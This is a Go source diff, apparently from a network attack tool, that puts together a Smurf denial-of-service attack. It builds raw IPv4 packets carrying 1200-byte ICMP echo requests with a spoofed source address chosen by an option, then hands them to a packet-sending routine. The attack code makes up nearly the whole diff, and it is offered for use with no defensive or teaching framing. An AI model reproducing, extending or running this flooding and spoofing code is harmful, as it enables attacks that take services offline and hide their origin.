@@ -4,8 +4,9 @@ import (
 	"os"
 	"log"
 	_"time"
+	"math/rand"
 
-	_"cjr/protocol"
+	"cjr/protocol"
 	flags "github.com/jessevdk/go-flags"
 )
 
@@ -52,9 +53,35 @@ func smurfEntry(remainFlags []string) {
 		}
 	}
 
-	pingOpts := &PingFloodOpt {
-		BaseOption: opts.BaseOption,
-		Spoof: opts.Spoof,
+	packetSend(smurfBuild, &opts)
+}
+
+func smurfBuild(opts_ CommonOption) []protocol.Layer {
+	opts := opts_.(*SmurfOpt)
+	srcip := chooseIPv4(opts.Spoof)
+
+	da := make([]byte, 1200, 1200)
+	icmp4 := &protocol.ICMPv4 {
+		Type: 8, // ICMP echo
+		Code: 0,
+		Id: 0x2237,
+		Seq: 0x3a,
+		//Data: []byte{0x1e,0x0a,0x05,0x00,0x00,0x00,0x00,0x00,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x2f,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37},
+		Data: da,
 	}
-	pingFloodStart(pingOpts)
+	ip4 := &protocol.IPv4Packet {
+		Version: 4,
+		IHL: 5,
+		DSCP: 0,
+		ECN: 0, // RFC 792 requires TOS = 0
+		ID: uint16(rand.Intn(0xffff)),
+		DF: true,
+		MF: false,
+		FragmentOffset: 0,
+		TTL: uint8(opts.TTL),
+		Protocol: protocol.IPP_ICMP,
+		SrcIP: srcip,
+		DstIP: opts.Dest(),
+	}
+	return []protocol.Layer{ip4, icmp4}
 }
